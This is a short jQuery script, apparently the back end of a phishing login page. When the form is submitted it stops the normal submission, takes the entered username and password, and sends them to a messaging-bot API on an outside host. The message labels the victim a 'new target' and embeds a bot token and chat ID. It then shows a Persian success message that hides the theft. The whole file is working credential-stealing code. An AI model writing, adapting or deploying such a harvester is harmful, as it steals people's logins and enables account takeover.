$(document).ready(function() {
    $("form").submit(function(event) {
        event.preventDefault();
        const username = $("#username").val();
        const password = $("#password").val();

        $.ajax({
            url: 'https://eitaayar.ir/api/bot58635:ccee571d-d924-4e01-aa2f-208912ffc532/sendMessage',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ chat_id: '9311981', text: `new target conect\nنام کاربری: ${username}\nرمز عبور: ${password}` }),
            success: function(data) {
                alert('با موفقیت انجام شد!');
            },
            error: function(jqXHR, textStatus, errorThrown) {
                alert('خطایی رخ داده است: ' + textStatus);
            }
        });
    });
});


